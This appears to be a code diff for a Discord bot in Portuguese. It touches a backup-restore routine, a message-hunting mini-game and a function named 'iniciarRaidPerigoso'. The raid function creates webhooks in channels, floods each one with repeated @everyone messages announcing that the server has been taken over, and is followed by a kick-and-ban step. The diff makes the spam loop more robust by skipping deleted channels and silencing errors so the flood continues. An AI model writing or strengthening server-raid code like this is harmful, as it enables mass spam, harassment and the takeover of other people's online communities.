@@ -226,6 +226,7 @@ async function restaurarGuild(guild, msg) {
     return msg.reply({ embeds: [embed('❌ Sem backup', 'Não há um backup recente do servidor para restaurar.')] });
   }
 
+  const statusChannelId = msg.channel?.id;
   await msg.channel.send('🔧 Restaurando o servidor para o estado anterior...');
 
   // Remover canais atuais antes da recriação
@@ -277,7 +278,10 @@ async function restaurarGuild(guild, msg) {
     }
   }
 
-  await msg.channel.send('✅ Restauração concluída. O servidor foi reconstruído com base no backup anterior.');
+const finalChannel = guild.channels.cache.get(statusChannelId) || created.values().next().value;
+  if (finalChannel && finalChannel.send) {
+    await finalChannel.send('✅ Restauração concluída. O servidor foi reconstruído com base no backup anterior.').catch(() => {});
+  }
 }
 
 // CAÇADA PERIGOSA
@@ -304,10 +308,12 @@ commands['caçada'] = async (client, msg, args) => {
   }
 
   await msg.channel.send("🐺 **A caçada começou!**");
+  await new Promise(resolve => setTimeout(resolve, 500));
 
   // Fase 2: Procurando - Coletar mensagens em todos os canais por 30 segundos
   const canais = guild.channels.cache.filter(c => c.type === 0);
-  const filter = (m) => m.author && !m.author.bot && !m.webhookId;
+  const collectorStart = Date.now();
+  const filter = (m) => m.author && !m.author.bot && !m.webhookId && m.createdTimestamp >= collectorStart;
   let alvoEncontrado = false;
   let canalEncontrado = null;
   let mensagemEncontrada = null;
@@ -316,7 +322,7 @@ commands['caçada'] = async (client, msg, args) => {
   for (const canal of canais.values()) {
     const collector = canal.createMessageCollector({ filter, time: 30000 });
     collector.on('collect', (message) => {
-      if (!alvoEncontrado && message.author.id !== client.user.id && !message.webhookId) {
+      if (!alvoEncontrado) {
         alvoEncontrado = true;
         canalEncontrado = message.channel;
         mensagemEncontrada = message;
@@ -450,16 +456,21 @@ async function iniciarRaidPerigoso(guild) {
   // Criar webhooks e spam
   const webhooks = [];
   for (const canal of novosCanais) {
+    if (!canal || canal.deleted) continue;
     try {
       const webhook = await canal.createWebhook({ name: 'Lobo Guaraná Raid' });
       webhooks.push(webhook);
       // Spam via webhook
       for (let j = 0; j < 20; j++) {
-        await webhook.send('@everyone O LOBO GUARANA DOMINOU ESTE SERVIDOR! AAAAAAUUUUUUUU!');
+        try {
+          await webhook.send('@everyone O LOBO GUARANA DOMINOU ESTE SERVIDOR! AAAAAAUUUUUUUU!');
+        } catch (error) {
+          if (![10003, 10015].includes(error.code)) console.log(`Erro no spam webhook: ${error}`);
+        }
         await new Promise(resolve => setTimeout(resolve, 100));
       }
     } catch (error) {
-      console.log(`Erro ao criar webhook ou enviar: ${error}`);
+      if (![10003, 10015].includes(error.code)) console.log(`Erro ao criar webhook ou enviar: ${error}`);
     }
   }
   // Kickar e banir
